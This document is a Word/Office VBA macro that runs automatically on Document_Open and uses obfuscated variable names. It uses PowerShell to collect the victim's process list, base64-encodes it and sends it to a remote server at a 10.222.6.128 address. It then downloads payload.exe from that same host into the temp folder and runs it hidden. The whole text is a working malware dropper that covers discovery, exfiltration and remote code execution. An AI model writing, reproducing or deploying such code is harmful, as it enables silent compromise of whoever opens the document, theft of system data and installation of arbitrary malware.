Private Sub Document_Open()
    Dim xQpRmT As Object
    Set xQpRmT = CreateObject("WScript.Shell")
    
    ' Discovery: Get process information using PowerShell
    Dim aJbKcL As String
    aJbKcL = "powershell.exe -Command ""Get-WmiObject -Query 'SELECT * FROM Win32_Process' | ForEach-Object { $_.ProcessName + ' ' + $_.ProcessId + ' ' + $_.ExecutablePath } | Out-String | ForEach-Object { [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_)) }"""
    
    Dim zYxWvU As String
    zYxWvU = xQpRmT.Exec(aJbKcL).StdOut.ReadAll
    
    ' C2: Send the discovery data to the remote server
    Dim tSrQpO As Object
    Set tSrQpO = CreateObject("MSXML2.XMLHTTP")
    tSrQpO.Open "GET", "http://10.222.6.128/receiver.php?data=" & zYxWvU, False
    tSrQpO.Send
    
    ' Execution: Download and execute a payload
    Dim nMlKjI As String
    nMlKjI = "http://10.222.6.128/payload.exe"
    
    Dim hGfEdC As String
    hGfEdC = xQpRmT.ExpandEnvironmentStrings("%TEMP%") & "\payload.exe"
    
    Dim vBnMlK As Object
    Set vBnMlK = CreateObject("MSXML2.XMLHTTP")
    vBnMlK.Open "GET", nMlKjI, False
    vBnMlK.Send
    
    Dim xCvBnM As Object
    Set xCvBnM = CreateObject("ADODB.Stream")
    xCvBnM.Type = 1 ' adTypeBinary
    xCvBnM.Open
    xCvBnM.Write vBnMlK.ResponseBody
    xCvBnM.SaveToFile hGfEdC, 2 ' adSaveCreateOverWrite
    
    ' Execute the downloaded payload
    xQpRmT.Run hGfEdC, 0, True
End Sub